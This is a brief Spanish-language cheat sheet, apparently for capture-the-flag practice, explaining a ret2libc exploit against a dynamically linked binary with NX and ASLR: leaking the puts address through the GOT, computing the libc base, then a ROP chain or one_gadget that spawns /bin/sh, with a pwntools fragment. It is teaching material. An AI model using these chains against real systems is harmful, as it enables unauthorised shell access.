# ret2libc con leak (cheat sheet)

Binario dinamico con NX+ASLR, sin funcion win. Objetivo: llamar system('/bin/sh') en libc.

## Fase 1: leak de libc
ret2plt: `pop rdi; ret` + p64(puts@got) + p64(puts@plt) + p64(main/vuln) para volver a leer.
Esto imprime la direccion real de puts. libc_base = leak - libc.sym['puts'].
Requiere que el binario haga flush (o setvbuf sin buffer) para ver el leak antes de bloquear.

## Fase 2: shell
Segundo payload: `ret`(alineacion) + `pop rdi; ret` + p64(binsh_in_libc) + p64(system).
binsh = next(libc.search(b'/bin/sh\\x00')); system = libc.base + libc.sym['system'].

## one_gadget
Alternativa a system: una direccion magica de libc que hace execve('/bin/sh') si se cumplen
constraints (p.ej. rsp+0x?? == NULL). `one_gadget libc.so.6`.

## pwntools
```python
libc = ELF('./libc.so.6')
# leak fase 1 -> libc.address = leak - libc.sym.puts
rop = ROP(elf); rop.call(rop.ret); rop.call('puts', [elf.got.puts]); rop.call('main')
```
